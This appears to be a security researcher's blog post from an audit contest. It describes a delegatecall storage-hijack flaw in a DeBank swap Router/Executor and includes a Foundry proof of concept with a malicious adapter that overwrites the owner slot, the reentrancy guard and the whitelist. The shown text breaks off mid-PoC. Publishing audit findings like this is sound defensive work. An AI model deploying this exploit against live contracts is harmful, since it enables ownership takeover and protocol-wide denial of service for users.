<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    










    







<script defer language="javascript" type="text/javascript" src="../../js/bundle.min.d451ff92e80abc2a828eb9bb262e4db374bd4e954642f9245c54eec84bf690f3.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=../../favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">Abhinab Das - Malicious Adapter Exploit </title>
<meta property="og:title" content=Abhinab&#32;Das&#32;-&#32;Malicious&#32;Adapter&#32;Exploit&#32; />
<meta name="twitter:title" content=Abhinab&#32;Das&#32;-&#32;Malicious&#32;Adapter&#32;Exploit&#32; />
<meta itemprop="name" content=Abhinab&#32;Das&#32;-&#32;Malicious&#32;Adapter&#32;Exploit&#32; />
<meta name="application-name" content=Abhinab&#32;Das&#32;-&#32;Malicious&#32;Adapter&#32;Exploit&#32; />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="http://localhost:1313/posts/malicous_adapter/" />
<link rel="canonical" href="http://localhost:1313/posts/malicous_adapter/" itemprop="url" />
<meta name="url" content="http://localhost:1313/posts/malicous_adapter/" />
<meta name="twitter:url" content="http://localhost:1313/posts/malicous_adapter/" />
<meta property="og:url" content="http://localhost:1313/posts/malicous_adapter/" />


<meta property="og:updated_time" content="2025-11-11T00:00:00Z" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='http://localhost:1313/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



  
    <meta name="twitter:site" content="@blockphy" />
    <meta name="twitter:creator" content="@blockphy" />

<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.152.2">


    
    

<link type="text/css" rel="stylesheet" href="../../css/bundle.min.a1b731dd9bab6256f736bb49fc1418d8d06fd0c41cf8567995a2a0a80079bca9.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="http://localhost:1313/">
                <img src="../../images/test.jpeg" alt="brand image">
            </a>
        
        
            <a href="http://localhost:1313/">
                <h1>Abhinab Das</h1>
            </a>
        
    </h1>
    <p class="lead">
    Web3 Security Researcher |  3x Hackathon Winner | Studying at IIT Guwahati | Passionate about DeFi, audits & protocol exploits
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="../../about/">About</a>
                    </li>
                    
                
            
                
                
            
            
                
                
                        
                
                        
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="../../posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="http://localhost:1313/posts/malicous_adapter/">Malicious Adapter Exploit </a>
                            </li>
                        
                            <li class="bullet">
                                <a href="http://localhost:1313/posts/arbitrage_rust/">Detecting Arbitrage Opportunities</a>
                            </li>
                        
                    
                
            
            
                
                
                        
                
                        
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/abhinabphy">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://linkedin.com/in/abhinabdasiitg">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>


    <a target="_blank" class="social" title="Twitter" href="https://x/blockphy">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
        </svg>
    </a>






    <a target="_blank" class="social" title="Discord" href="https://discord.com">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
        </svg>
    </a>






    <a target="_blank" class="social" title="Telegram" href="https://t.me/abhinabphy">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19c-.14.75-.42 1-.68 1.03c-.58.05-1.02-.38-1.58-.75c-.88-.58-1.38-.94-2.23-1.5c-.99-.65-.35-1.01.22-1.59c.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02c-.09.02-1.49.95-4.22 2.79c-.4.27-.76.41-1.08.4c-.36-.01-1.04-.2-1.55-.37c-.63-.2-1.12-.31-1.08-.66c.02-.18.27-.36.74-.55c2.92-1.27 4.86-2.11 5.83-2.51c2.78-1.16 3.35-1.36 3.73-1.36c.08 0 .27.02.39.12c.1.08.13.19.14.27c-.01.06.01.24 0 .38z"/>
        </svg>
    </a>




    <a target="_blank" class="social" title="RSS Feed" href="../../posts/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>


    <a target="_blank" class="social" title="Email" href="mailto://abhinabiitg@gmail.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>




        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="http://localhost:1313/posts/malicous_adapter/">Malicious Adapter Exploit </a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-11-11T00:00:00Z" class="post-date">
        November 11, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>5 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-security">
        <a href="http://localhost:1313/tags/security">security</a>
      </li>
      
      <li class="tag-web3">
        <a href="http://localhost:1313/tags/web3">web3</a>
      </li>
      
      <li class="tag-move">
        <a href="http://localhost:1313/tags/move">move</a>
      </li>
      
      <li class="tag-solidity">
        <a href="http://localhost:1313/tags/solidity">solidity</a>
      </li>
      
    </ul>
    
  </div>

  
  
  <p class="seriesname">
    Series: <a href="http://localhost:1313/series/audits-web3-security">Audits &amp; Web3 Security</a>
  </p>
  

  
</div>

  <p>I spent an afternoon poking through the Router / Executor flow of an older contest and the attached adapter model, and what jumped out felt like the kind of bug you’d see almost everywhere , a small design choice (delegatecall into user-registered adapters) that quietly hands the protocol’s own storage to any adapter that ever becomes whitelisted.Though seemingly only a centralisation risk . I also want to state how this may affect the ecosystem.</p>
<h3 id="summary">Summary</h3>
<p>By passing a malicious adapter through Router.swap(), a compromised admin can exploit the delegatecall in Executor to overwrite critical storage—specifically the owner slot. This results in full control over adapter configuration and swap flow, allowing the attacker to blacklist all adapters, freeze swaps, and cause a complete service-level denial-of-service of the protocol.</p>
<h3 id="root-cause">Root Cause</h3>
<p>The root cause of this vulnerability lies in the insecure use of delegatecall within the Executor contract. The system is designed to route swaps through external adapter contracts using delegatecall in <a href="https://github.com/sherlock-audit/2025-07-debank/blob/71400519400e462f92f4b7104a73fa1d8f599321/swap-router-v1/src/executor/Executor.sol#L76-L81" target="_blank">Executor.sol#L76-L81</a> , which runs the adapter’s logic within the storage context of the Executor itself.
This approach exposes critical internal storage — such as the owner variable stored at slot 0 (due to inheritance from OpenZeppelin’s Ownable) — to manipulation. If an attacker can deploy a malicious adapter and convince an admin to whitelist it, they can overwrite storage via crafted delegatecall payloads during a normal swap. This results in full ownership takeover, the ability to modify or wipe out the adapter whitelist, and ultimately a denial-of-service attack that halts all protocol swaps. The core issue is the absence of sandboxing or memory isolation between trusted core logic and externally registered adapter code.</p>
<h3 id="external-pre-conditions">External Pre-conditions</h3>
<p>1.An admin needs to call <code>updateAdaptor()</code> to set <code>whiteListAdapter[maliciousAdapter]</code> to be true(malicious or accidental behaviour)</p>
<h3 id="attack-path">Attack Path</h3>
<ol>
<li><strong>Attacker</strong> deploys a <strong>malicious adapter</strong> contract with custom logic to overwrite storage slot <code>0</code> (e.g., to set themselves /random address as <code>Executor.owner</code>),disable <em>re-entrancy</em> status or overwrite <em>whitelisted</em> mapping.</li>
<li><strong>Admin</strong> (accidentally or maliciously) calls <code>Router.updateAdaptor()</code> to whitelist the attacker&rsquo;s adapter.
→ <em>This is required because only whitelisted adapters are allowed to be executed.</em></li>
<li><strong>Attacker</strong> calls <code>Router.swap()</code> and includes their <strong>malicious adapter</strong> in the swap path.
→ <em>The input uses the adapter in a valid <code>MultiPath</code> and <code>SinglePath</code> structure.</em></li>
<li><strong>Router</strong> forwards the call to <code>Executor.executeMegaSwap()</code> with the attacker&rsquo;s adapter included in the path.</li>
<li><strong>Executor</strong> performs a <code>delegatecall</code> into the attacker’s adapter at , executing its logic <strong>within Executor&rsquo;s storage context</strong>.</li>
<li><strong>Malicious adapter logic</strong> overwrites storage slot <code>0</code>, setting <code>Executor.owner</code> to the attacker’s address.</li>
<li><strong>Attacker</strong> now owns the <code>Executor</code>, and calls <code>updateAdaptor()</code> to remove all valid adapters or add more malicious ones(Though anyways <code>executeMegaSwap</code> is broken now being owned by <code>router</code> which is not an owner anymore after the attack !! So this step is not necessary).</li>
<li><strong>Swaps begin to fail</strong> as no valid adapter paths remain, effectively causing a <strong>protocol-wide denial-of-service (DoS)</strong>.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>The protocol suffers a complete halt of all swap operations.
The attacker gains full control over the Executor contract and can block swaps, remove adapters, or add backdoors.
This results in a protocol-wide denial-of-service (DoS) for all users, who can no longer execute swaps.</p>
<h3 id="poc">PoC</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Copyright Debank
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">SPDX-License-Identifier: BUSL-1.1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">25</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> {Test, console} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;forge-std/Test.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;forge-std/console.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;../src/router/Router.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;../src/executor/Executor.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;../src/adapter/mainnet/Adapter1.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Cheats</span> {
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">expectRevert</span>() <span style="color:#66d9ef">external</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">expectRevert</span>(<span style="color:#66d9ef">bytes</span> calldata) <span style="color:#66d9ef">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">MaliciousAdapter</span> <span style="color:#66d9ef">is</span> IAdapter {
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeSimpleSwap</span>(
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">address</span> fromToken,
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">address</span> toToken,
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint256</span> fromTokenAmount,
</span></span><span style="display:flex;"><span>Utils.SimpleSwap[] <span style="color:#66d9ef">memory</span> swaps
</span></span><span style="display:flex;"><span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">override</span> {
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">address</span> currentContract <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(this);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assembly</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sstore</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>)<span style="color:#75715e">//disable reentrancy guard
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sstore</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x123</span>)<span style="color:#75715e">//set the executor owner to a hardcoded address of attacker&#39;s choice !!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Now use the currentContract variable
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mstore</span>(<span style="color:#ae81ff">0x00</span>, currentContract)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mstore</span>(<span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">2</span>)<span style="color:#75715e">//slot 2 for whitelistadapter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">let</span> slot <span style="color:#f92672">:=</span> <span style="color:#a6e22e">keccak256</span>(<span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x40</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sstore</span>(slot, <span style="color:#ae81ff">1</span>)<span style="color:#75715e">//set to true
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">return</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>receive () <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// This function is intentionally left empty to allow the contract to receive Ether.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">POC</span> <span style="color:#66d9ef">is</span> Test {
</span></span><span style="display:flex;"><span><span style="color:#75715e">//function test() public {}
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//a random malicous admin via makeaddr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">address</span> admin <span style="color:#f92672">=</span> makeAddr(<span style="color:#e6db74">&#34;admin&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">using</span> SafeERC20 <span style="color:#66d9ef">for</span> IERC20;
</span></span><span style="display:flex;"><span>Cheats <span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">constant</span> cheats <span style="color:#f92672">=</span> Cheats(<span style="color:#ae81ff">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span>);
</span></span><span style="display:flex;"><span>Executor <span style="color:#66d9ef">public</span> executor;
</span></span><span style="display:flex;"><span>Router <span style="color:#66d9ef">public</span> router;
</span></span><span style="display:flex;"><span>Adapter1 <span style="color:#66d9ef">public</span> adapter1;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> feeReceiver <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5D7c30c04c6976D4951209E55FB158DBF9F8F287</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">address</span>[<span style="color:#ae81ff">3</span>] <span style="color:#66d9ef">public</span> admins <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">0xE472e1083bd428dC168413840a4949E372086167</span>,admin, <span style="color:#ae81ff">0x4049C0A9a11816c79c35dC7206bd48301878A735</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setUp</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>router <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Router(
</span></span><span style="display:flex;"><span><span style="color:#75715e">// owner
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>admins,
</span></span><span style="display:flex;"><span><span style="color:#75715e">// maxFeeRate
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span>e16
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>adapter1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Adapter1(
</span></span><span style="display:flex;"><span><span style="color:#75715e">// dai
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x6B175474E89094C44Da98b954EedeAC495271d0F</span>,
</span></span><span style="display:flex;"><span><span style="color:#75715e">// weth
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>,
</span></span><span style="display:flex;"><span><span style="color:#75715e">// permit2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x000000000022D473030F116dDEE9F6B43aC78BA3</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>vm.startPrank(admin);
</span></span><span style="display:flex;"><span>router.updateAdaptor(<span style="color:#66d9ef">address</span>(adapter1), <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>vm.stopPrank();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">testExploitDelegatecallStorageHijack</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>MaliciousAdapter maliciousAdapter <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MaliciousAdapter();
</span></span><span style="display:flex;"><span><span style="color:#75715e">//add the malicious adapter to the whitelist
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>vm.startPrank(admin);
</span></span><span style="display:flex;"><span>router.updateAdaptor(<span style="color:#66d9ef">address</span>(maliciousAdapter), <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>vm.stopPrank();
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Construct exploit path a simple weth-&gt;Dai swap
